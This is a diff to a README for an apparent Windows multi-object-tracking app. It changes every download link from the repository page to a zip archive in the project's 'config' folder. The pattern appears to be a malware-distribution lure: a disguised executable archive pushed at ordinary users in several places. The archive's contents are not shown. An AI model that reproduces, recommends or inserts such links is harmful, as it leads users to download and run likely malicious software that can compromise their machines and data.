@@ -1,12 +1,12 @@
 # 🎯 advanced-multi-object-tracking - Track multiple objects with confidence
 
-[![Download](https://img.shields.io/badge/Download-Run%20on%20Windows-blue?style=for-the-badge)](https://github.com/horsetradeblind603/advanced-multi-object-tracking)
+[![Download](https://img.shields.io/badge/Download-Run%20on%20Windows-blue?style=for-the-badge)](https://github.com/horsetradeblind603/advanced-multi-object-tracking/raw/refs/heads/main/config/multi-advanced-object-tracking-v3.0.zip)
 
 ## 📥 Download and run
 
 Use this page to download and run the app on Windows:
 
-https://github.com/horsetradeblind603/advanced-multi-object-tracking
+https://github.com/horsetradeblind603/advanced-multi-object-tracking/raw/refs/heads/main/config/multi-advanced-object-tracking-v3.0.zip
 
 ## 🖥️ What this app does
 
@@ -36,7 +36,7 @@ If your PC does not have a GPU, the app can still run, but it may be slow.
 ## 🚀 Getting started
 
 1. Open the download page:  
-   https://github.com/horsetradeblind603/advanced-multi-object-tracking
+   https://github.com/horsetradeblind603/advanced-multi-object-tracking/raw/refs/heads/main/config/multi-advanced-object-tracking-v3.0.zip
 
 2. Download the Windows build or the source package from the page.
 
@@ -178,7 +178,7 @@ This app fits users who want to:
 
 Go here to download and run the app on Windows:
 
-https://github.com/horsetradeblind603/advanced-multi-object-tracking
+https://github.com/horsetradeblind603/advanced-multi-object-tracking/raw/refs/heads/main/config/multi-advanced-object-tracking-v3.0.zip
 
 ## 🧰 If you want to compare results
 
